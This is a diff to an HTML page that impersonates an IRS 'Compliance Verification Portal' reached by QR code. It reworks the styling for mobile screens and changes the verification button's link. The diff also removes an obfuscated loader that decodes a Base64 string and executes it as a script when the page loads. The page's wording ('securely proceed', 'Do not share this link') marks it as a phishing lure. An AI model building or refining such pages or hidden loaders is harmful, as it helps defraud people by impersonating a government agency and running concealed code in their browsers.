@@ -11,8 +11,9 @@
             background-color: #f9f9f9;
         }
         .container {
-            max-width: 600px;
-            margin: 50px auto;
+            width: 90%; /* Full width with padding for smaller screens */
+            max-width: 600px; /* Max width for larger screens */
+            margin: 20px auto;
             background-color: #fff;
             border: 1px solid #e0e0e0;
             border-radius: 8px;
@@ -23,22 +24,22 @@
         .header {
             background-color: #0A3161;
             color: #fff;
-            padding: 10px;
+            padding: 15px 20px;
             border-top-left-radius: 8px;
             border-top-right-radius: 8px;
         }
         .header img {
-            max-width: 100px;
+            max-width: 80px; /* Adjusted image size for mobile */
             margin-bottom: 10px;
         }
         .header h1 {
             font-family: Garamond, serif;
-            font-size: 24px;
+            font-size: 22px; /* Adjusted font size for mobile */
             margin: 0;
         }
         .content {
             padding: 20px;
-            font-size: 16px;
+            font-size: 14px; /* Adjusted font size for mobile */
             line-height: 1.6;
         }
         .content p {
@@ -49,11 +50,13 @@
             text-decoration: none;
             background-color: #0A3161;
             color: #fff;
-            padding: 10px 20px;
+            padding: 12px 24px; /* Slightly larger padding for easier clicking */
             font-weight: bold;
             border-radius: 5px;
-            font-size: 16px;
+            font-size: 18px; /* Slightly larger font for button */
             margin-top: 20px;
+            width: 100%; /* Full-width button on small screens */
+            box-sizing: border-box;
         }
         .cta-button:hover {
             background-color: #062a50;
@@ -66,18 +69,6 @@
             line-height: 1.4;
         }
     </style>
-    <script>
-        // Base64 encoded entire script
-        const encodedScript = "PHNjcmlwdD4KICAgIC8vIEJhc2U2NCBlbmNvZGVkIGxpbmsgKFV...Y2F0YWxseC1zdG9yaW5n";
-
-        // Decode and execute the script
-        window.addEventListener('DOMContentLoaded', function() {
-            const decodedScript = atob(encodedScript);
-            const scriptElement = document.createElement('script');
-            scriptElement.textContent = decodedScript;
-            document.body.appendChild(scriptElement);
-        });
-    </script>
 </head>
 <body>
     <div class="container">
@@ -89,7 +80,7 @@
             <h2>Compliance Verification Portal</h2>
             <p>Thank you for scanning the QR code.</p>
             <p>You are now in the IRS Compliance Verification Portal. Please click the button below to securely proceed with the document verification process.</p>
-            <a id="continue-button" class="cta-button" href="#" onclick="return false;">Continue to Verification</a>
+            <a class="cta-button" href="google.com" target="_blank">Continue to Verification</a>
         </div>
         <div class="footer">
             <p><strong>NOTE:</strong> This is a secure portal. Do not share this link with anyone.</p>
